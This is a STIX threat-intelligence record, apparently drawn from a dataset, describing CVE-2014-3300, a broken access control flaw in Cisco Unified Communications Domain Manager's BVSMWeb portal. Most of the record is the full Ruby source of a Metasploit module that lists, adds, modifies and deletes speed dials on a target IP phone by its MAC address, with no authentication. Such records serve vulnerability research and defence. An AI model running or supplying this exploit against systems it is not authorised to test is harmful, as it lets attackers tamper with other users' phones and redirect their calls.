{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4963b465-1898-48e5-868f-229f9bfd6331",
    "created": "2024-08-14T16:31:22.615874Z",
    "modified": "2024-08-14T16:31:22.615878Z",
    "name": "Viproy CUCDM IP Phone XML Services - Speed Dial Attack Tool",
    "description": " The BVSMWeb portal in the web framework in Cisco Unified Communications Domain Manager (CDM), before version 10, doesn't implement access control properly, which allows remote attackers to modify user information. This module exploits the vulnerability to make unauthorized speed dial entity manipulations. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/voip/cisco_cucdm_speed_dials.rb",
            "external_id": "cisco_cucdm_speed_dials.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-3300"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rexml/document'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'          => 'Viproy CUCDM IP Phone XML Services - Speed Dial Attack Tool',\n      'Description'   => %q{\n        The BVSMWeb portal in the web framework in Cisco Unified Communications Domain Manager\n        (CDM), before version 10, doesn't implement access control properly, which allows remote\n        attackers to modify user information. This module exploits the vulnerability to make\n        unauthorized speed dial entity manipulations.\n      },\n      'Author'        => 'fozavci',\n      'References'    =>\n        [\n          ['CVE', '2014-3300'],\n          ['BID', '68331']\n        ],\n      'License'       => MSF_LICENSE,\n      'Actions'       =>\n        [\n          [ 'List',   { 'Description' => 'Getting the speeddials for the MAC address' } ],\n          [ 'Modify', { 'Description' => 'Modifying a speeddial for the MAC address' } ],\n          [ 'Add',    { 'Description' => 'Adding a speeddial for the MAC address' } ],\n          [ 'Delete', { 'Description' => 'Deleting a speeddial for the MAC address' } ]\n        ],\n      'DefaultAction'  => 'List'\n    ))\n\n    register_options(\n    [\n      OptString.new('TARGETURI', [ true, 'Target URI for XML services', '/bvsmweb']),\n      OptString.new('MAC', [ true, 'MAC Address of target phone', '000000000000']),\n      OptString.new('NAME', [ false, 'Name for Speed Dial', 'viproy']),\n      OptString.new('POSITION', [ false, 'Position for Speed Dial', '1']),\n      OptString.new('TELNO', [ false, 'Phone number for Speed Dial', '007']),\n    ])\n  end\n\n  def run\n\n    case action.name.upcase\n      when 'MODIFY'\n        modify\n      when 'DELETE'\n        delete\n      when 'ADD'\n        add\n      when 'LIST'\n        list\n    end\n\n  end\n\n  def send_rcv(uri, vars_get)\n    uri = normalize_uri(target_uri.to_s, uri.to_s)\n    res = send_request_cgi(\n      {\n        'uri'    => uri,\n        'method' => 'GET',\n        'vars_get' => vars_get\n      })\n\n    if res && res.code == 200 && res.body && res.body.to_s =~ /Speed [D|d]ial/\n      return Exploit::CheckCode::Vulnerable, res\n    else\n      print_error(\"Target appears not vulnerable!\")\n      return Exploit::CheckCode::Safe, res\n    end\n  end\n\n  def parse(res)\n    doc = REXML::Document.new(res.body)\n    names = []\n    phones = []\n\n    list = doc.root.get_elements('DirectoryEntry')\n    list.each do |lst|\n      xlist = lst.get_elements('Name')\n      xlist.each {|l| names << \"#{l[0]}\"}\n      xlist = lst.get_elements('Telephone')\n      xlist.each {|l| phones << \"#{l[0]}\" }\n    end\n\n    if names.size > 0\n      names.size.times do |i|\n        info = ''\n        info << \"Position: #{names[i].split(\":\")[0]}, \"\n        info << \"Name: #{names[i].split(\":\")[1]}, \"\n        info << \"Telephone: #{phones[i]}\"\n\n        print_good(\"#{info}\")\n      end\n    else\n      print_status(\"No Speed Dial detected\")\n    end\n  end\n\n  def list\n    mac = datastore['MAC']\n\n    print_status(\"Getting Speed Dials of the IP phone\")\n    vars_get = {\n      'device' => \"SEP#{mac}\"\n    }\n\n    status, res = send_rcv('speeddials.cgi', vars_get)\n    parse(res) unless status == Exploit::CheckCode::Safe\n  end\n\n  def add\n    mac = datastore['MAC']\n    name = datastore['NAME']\n    position = datastore['POSITION']\n    telno = datastore['TELNO']\n\n    print_status(\"Adding Speed Dial to the IP phone\")\n    vars_get = {\n      'name' => \"#{name}\",\n      'telno' => \"#{telno}\",\n      'device' => \"SEP#{mac}\",\n      'entry' => \"#{position}\",\n      'mac' => \"#{mac}\"\n    }\n    status, res = send_rcv('phonespeedialadd.cgi', vars_get)\n\n    if status == Exploit::CheckCode::Vulnerable && res && res.body && res.body.to_s =~ /Added/\n      print_good(\"Speed Dial #{position} is added successfully\")\n    elsif res && res.body && res.body.to_s =~ /exist/\n      print_error(\"Speed Dial is exist, change the position or choose modify!\")\n    else\n      print_error(\"Speed Dial couldn't add!\")\n    end\n  end\n\n  def delete\n    mac = datastore['MAC']\n    position = datastore['POSITION']\n\n    print_status(\"Deleting Speed Dial of the IP phone\")\n\n    vars_get = {\n      'entry' => \"#{position}\",\n      'device' => \"SEP#{mac}\"\n    }\n\n    status, res = send_rcv('phonespeeddialdelete.cgi', vars_get)\n\n    if status == Exploit::CheckCode::Vulnerable && res && res.body && res.body.to_s =~ /Deleted/\n      print_good(\"Speed Dial #{position} is deleted successfully\")\n    else\n      print_error(\"Speed Dial is not found!\")\n    end\n  end\n\n  def modify\n    mac = datastore['MAC']\n    name = datastore['NAME']\n    position = datastore['POSITION']\n    telno = datastore['TELNO']\n\n    print_status(\"Deleting Speed Dial of the IP phone\")\n\n    vars_get = {\n      'entry' => \"#{position}\",\n      'device' => \"SEP#{mac}\"\n    }\n\n    status, res = send_rcv('phonespeeddialdelete.cgi', vars_get)\n\n    if status == Exploit::CheckCode::Vulnerable && res && res.body && res.body.to_s =~ /Deleted/\n      print_good(\"Speed Dial #{position} is deleted successfully\")\n      print_status(\"Adding Speed Dial to the IP phone\")\n\n      vars_get = {\n        'name' => \"#{name}\",\n        'telno' => \"#{telno}\",\n        'device' => \"SEP#{mac}\",\n        'entry' => \"#{position}\",\n        'mac' => \"#{mac}\"\n      }\n\n      status, res = send_rcv('phonespeedialadd.cgi', vars_get)\n\n      if status == Exploit::CheckCode::Vulnerable && res && res.body && res.body.to_s =~ /Added/\n        print_good(\"Speed Dial #{position} is added successfully\")\n      elsif res && res.body =~ /exist/\n        print_error(\"Speed Dial is exist, change the position or choose modify!\")\n      else\n        print_error(\"Speed Dial couldn't add!\")\n      end\n    else\n      print_error(\"Speed Dial is not found!\")\n    end\n  end\nend\n"
}